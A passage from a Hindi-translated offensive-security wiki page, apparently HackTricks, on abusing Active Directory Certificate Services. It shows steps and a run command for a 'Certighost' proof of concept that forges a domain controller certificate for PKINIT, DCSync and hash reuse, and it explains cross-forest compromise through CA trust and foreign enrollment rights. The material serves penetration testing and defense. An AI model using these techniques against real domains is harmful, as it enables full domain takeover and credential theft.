3. Attacker-controlled **`cdc`** और target **`rmd`** attributes वाला certificate request submit करें।
4. CA को controlled machine account के रूप में rogue listeners से authenticate करने दें, लेकिन identity lookups के उत्तर में **target DC** के attributes लौटाएं।
5. CA-signed **DC certificate** प्राप्त करें और फिर उसे **PKINIT** के लिए उपयोग करें।
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC से उपयोगी runtime flags:

- `--listener <ip>`: `cdc` में advertised callback IP को स्पष्ट रूप से चुनें
- `--computer-name <NAME$>`: नया machine account बनाने के बजाय किसी मौजूदा machine account का reuse करें

**Operational notes:**

- PoC को **root** की आवश्यकता होती है, क्योंकि यह **privileged ports** `389` और `445` पर bind करता है।
- सफल exploitation स्थानीय रूप से एक **DC `.pfx`** और **Kerberos `.ccache`** लिखता है।
- क्योंकि certificate एक **Domain Controller account** से map होता है, follow-on actions में **certificate-based Kerberos auth**, **DCSync**, और recovered **machine NT hash** का reuse शामिल हो सकता है।<sup>[[2]](#references)</sup>

## Certificates के साथ Forests को Compromise करना: Passive Voice में समझाया गया

### Compromised CAs द्वारा Forest Trusts को तोड़ना

**cross-forest enrollment** के लिए configuration को अपेक्षाकृत सरल बनाया जाता है। Resource forest से प्राप्त **root CA certificate** को administrators द्वारा **account forests** में **publish** किया जाता है, और resource forest के **enterprise CA** certificates को प्रत्येक account forest में मौजूद **`NTAuthCertificates` और AIA containers** में **add** किया जाता है। स्पष्ट रूप से, इस arrangement के कारण resource forest में मौजूद **CA** को उन सभी अन्य forests पर पूरा control प्राप्त हो जाता है, जिनके लिए वह PKI manage करता है। यदि इस CA को **attackers द्वारा compromise** कर लिया जाए, तो resource और account forests दोनों के सभी users के लिए certificates उनके द्वारा **forge** किए जा सकते हैं, जिससे forest की security boundary टूट जाती है।<sup>[[6]](#references)</sup>

### Foreign Principals को दिए गए Enrollment Privileges

Multi-forest environments में उन Enterprise CAs के संबंध में सावधानी आवश्यक है जो ऐसे **certificate templates publish** करती हैं, जो **Authenticated Users या foreign principals** (उस forest से बाहर के users/groups, जिससे Enterprise CA संबंधित है) को **enrollment और edit rights** प्रदान करते हैं।\
किसी trust के across authentication होने पर, AD द्वारा **Authenticated Users SID** को user के token में add किया जाता है। इसलिए, यदि किसी domain में ऐसा Enterprise CA मौजूद हो जिसके template में **Authenticated Users enrollment rights** की अनुमति हो, तो किसी अलग forest का user संभावित रूप से उस template में **enroll** कर सकता है। इसी प्रकार, यदि किसी template द्वारा **enrollment rights** किसी foreign principal को explicitly grant किए गए हों, तो इससे **cross-forest access-control relationship** create हो जाता है, जिसके कारण एक forest का principal दूसरे forest के template में **enroll** कर सकता है।

दोनों scenarios एक forest से दूसरे forest तक **attack surface** में वृद्धि का कारण बनते हैं। Certificate template की settings का attacker द्वारा exploitation करके किसी foreign domain में additional privileges प्राप्त किए जा सकते हैं।<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services का दुरुपयोग](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, नई Authentication और Request Methods तथा अन्य](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover के लिए Key Trust Account Mapping का दुरुपयोग](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage की कहानी](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC के माध्यम से AD Certificate Services पर Relaying](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM के साथ ADCS CA तक Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: सिर्फ एक और AD CS ESC नहीं](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration और Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
